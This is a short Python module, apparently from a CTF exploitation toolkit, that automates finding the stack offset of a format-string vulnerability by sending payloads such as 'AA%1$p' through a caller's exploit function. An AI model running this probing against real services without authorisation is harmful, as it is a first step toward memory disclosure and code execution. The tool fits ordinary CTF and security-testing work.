from argparse import ArgumentError
import random
from typing import Callable
from sgtpyutils.logger import logger


def exp_get_str_position(exp: Callable, buf_length: int = None, max_position: int = 100):
    '''
    get format-str-position by exp multi-times
    notice,you should manualy restart game if crash by exp

    exp: Callable[buf:bytes] -> bytes : buf is from exp payload , and return its content
    buf_length: int : if buf_length == None then no length limit ,otherwise limit it
                    etc.AA%1$p required at least 6bytes of length.
    max_position:int : max-str-position possiable ,default is pos-100
    '''
    if not buf_length:
        buf_length = 6
    if buf_length < 5:
        raise ArgumentError(
            'too short buf_length , at least need 5bytes for A%1$p')
    template = '{char}%{pos}$p'

    def test_payload(chars: str, current_position: int):
        content = template.replace('{char}', chars).replace(
            '{pos}', str(current_position))
        c_hex = chars.encode('ascii')[::-1].hex()
        data = exp(content.encode('ascii')).decode('ascii')
        if not data:
            raise Exception('seems you havnt return any data')
        return c_hex in data, content
    import string
    libs = string.digits + string.ascii_letters
    libs_len = len(libs)

    def single_char():
        return libs[random.randint(0, libs_len-1)]

    for i in range(1,max_position+1):
        char_length = buf_length - 3 - len(str(i))
        if char_length < 0:
            raise Exception(
                'seems no way to get more position cause of position length too-much to generate chars')

        success = True
        for succes_time in range(5):
            chars = ''.join([single_char() for x in range(char_length)])
            r, payload = test_payload(chars, i)
            if not r:
                success = False
                break
        if success:
            logger.info(
                f'found string format position at {i} , with payload :{payload}')
            return i
